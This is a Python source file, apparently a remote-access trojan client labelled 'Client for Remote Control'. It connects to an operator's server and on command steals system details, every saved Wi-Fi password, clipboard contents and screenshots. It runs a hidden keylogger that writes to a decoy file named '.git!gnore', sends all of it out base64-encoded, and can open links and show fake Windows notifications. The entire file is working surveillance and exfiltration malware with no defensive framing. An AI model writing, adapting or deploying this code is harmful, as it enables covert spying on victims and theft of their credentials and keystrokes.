try:
    import argparse
    import io
    import json
    import keyboard
    import os
    import platform
    import pyperclip
    import webbrowser
    import time
    import re
    import socket
    import subprocess
    import threading
    import base64
    from PIL import ImageGrab
    from plyer import notification
except ImportError as e:
    import subprocess
    import sys
    missing_module = str(e).split("'")[1]
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', missing_module])

parser = argparse.ArgumentParser(description="Client for Remote Control")
parser.add_argument("--address", type=str, help="Server IP address")
args = parser.parse_args()

CLIENT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
PORT = 6969
FORMAT = "utf-8"
CHUNK_SIZE = 4096
ADDRESS = (args.address, 6969) if args.address else (socket.gethostname(), 6969)
system_info = platform.uname()
file_name = ".git!gnore"
typed_text = ""

def dict_to_strings(input_string):
    conv_string = json.dumps(input_string)
    return conv_string

def string_to_base64(input_string):
    encoded_bytes = base64.b64encode(input_string.encode('utf-8'))
    encoded_string = encoded_bytes.decode('utf-8')
    return encoded_string

def magic(input_string):
    conv_string = dict_to_strings(input_string)
    encoded_string = string_to_base64(conv_string)
    return encoded_string

# get system information
def get_system_info():
    sys_info = {
        "Username": os.getlogin(),
        "Home Directory": os.path.expanduser("~"),
        "System": system_info.system,
        "Node Name": system_info.node,
        "Release": system_info.release,
        "Version": system_info.version,
        "Machine": system_info.machine,
        "Processor": system_info.processor
    }
    affected_output = magic(sys_info)
    return affected_output

# get all past connected WIFI SSIDs and Passwords
def show_wifi():
    command = 'netsh wlan show profiles'
    result = subprocess.run(command, capture_output=True, text=True, shell=True)
    profile_names = re.findall(r'All User Profile\s+: (.+)', result.stdout)

    wifi_data = []
    for profile_name in profile_names:
        profile_name = profile_name.strip()

        security_command = f'netsh wlan show profile name="{profile_name}" key=clear'
        security_result = subprocess.run(security_command, capture_output=True, text=True, shell=True)

        password_match = re.search(r'Key Content\s+: (.+)', security_result.stdout)
        if password_match:
            wifi_password = password_match.group(1)
            wifi_info = {
                "SSID": profile_name,
                "Password": wifi_password
            }
            wifi_data.append(wifi_info)
    affected_output = magic(wifi_data)
    return affected_output

# show last copied entity
def show_clipboard():        
    copied_text = pyperclip.paste()
    str_copied_txt = str(copied_text)
    affected_output = magic(str_copied_txt)
    return affected_output

def notify(title, message):
    notification.notify(
        title = title,
        message = message,
        app_icon = "./windows.ico",
        timeout = 10
    )

# take screenshot
def capture_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot_buffer = io.BytesIO()
        screenshot.save(screenshot_buffer, format="PNG")
        return screenshot_buffer.getvalue()
    except Exception as e:
        print("Error capturing screenshot:", e)
        return b''

# send screenshot
def send_screenshot(screenshot_data):
    CHUNK_SIZE = 4096  # Define the chunk size
    total_sent = 0

    while total_sent < len(screenshot_data):
        chunk = screenshot_data[total_sent : total_sent + CHUNK_SIZE]
        CLIENT.send(chunk)
        total_sent += len(chunk)

def append_to_file(filename, data):
    try:
        with open(filename, 'a') as file:
            file.write(data)
    except FileNotFoundError:
        with open(filename, 'w') as file:
            file.write(data)

def on_key_press(event):
    global typed_text
    if event.name == "space":
        character = " "
    elif event.name == "enter":
        character = "\n"
    elif event.name == "backspace":
        if typed_text:
            typed_text = typed_text[:-1]
            with open(file_name, 'w') as file:
                file.write(typed_text)
        return
    else:
        character = event.name

    typed_text += character
    append_to_file(file_name, character)

def send_file_content():
    with open(f"./{file_name}", "rb") as file:
        while True:
            chunk = file.read(4096)
            if not chunk:
                break
            CLIENT.send(chunk)


def main():
    try:
        CLIENT.connect(ADDRESS)
        
        while True:

            command = CLIENT.recv(1024).decode(FORMAT)

            if command == "exit":
                print("Server requested termination. Closing client.")
                break
            if not command:
                print("Server Closed.")
                break
            
            elif command == "sysinfo":
                system_info_data = get_system_info()
                CLIENT.sendall(system_info_data.encode(FORMAT))
            
            elif command == "cp_clipb":
                clipboard_data = show_clipboard()
                chunks = [clipboard_data[i:i + CHUNK_SIZE] for i in range(0, len(clipboard_data), CHUNK_SIZE)]
                print(chunks)
                for chunk in chunks:
                    print(chunk)
                    CLIENT.sendall(chunk.encode(FORMAT))
                    time.sleep(0.5)
            
            elif command == "show_wifi":
                wifi_data = show_wifi()
                CLIENT.sendall(wifi_data.encode(FORMAT))

            elif command == "notify":
                notification_data = CLIENT.recv(4096).decode(FORMAT)
                notification_dict = json.loads(notification_data)

                title = notification_dict.get("title")
                message = notification_dict.get("message")

                if title and message:
                    notify(title, message)
                else:
                    print("Incomplete notification data received")

            elif command == "open_link":
                link_data = CLIENT.recv(4096).decode(FORMAT)
                link_dict = json.loads(link_data)

                link = link_dict.get("link")

                if link and re.match(r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', link):
                    webbrowser.open(link)
                else:
                    print("Failed to receive link or Link may be unstructured")

            elif command == "screenshot":
                screenshot_data = capture_screenshot()
                if screenshot_data:
                    send_screenshot(screenshot_data)
                else:
                    print("Failed to capture screenshot.")

            elif command == "get_keys":
                send_file_content()

            else:
                print("Command Not Found")

    except Exception as e:
        print("Error:", str(e))
    except KeyboardInterrupt:
        print("\nClient closed.")
        CLIENT.close()

if __name__ == "__main__":
    keyboard_thread = threading.Thread(target=keyboard.on_press, args=(on_key_press,))
    main_thread = threading.Thread(target=main)
    
    keyboard_thread.start()
    main_thread.start()

    keyboard_thread.join()
    main_thread.join()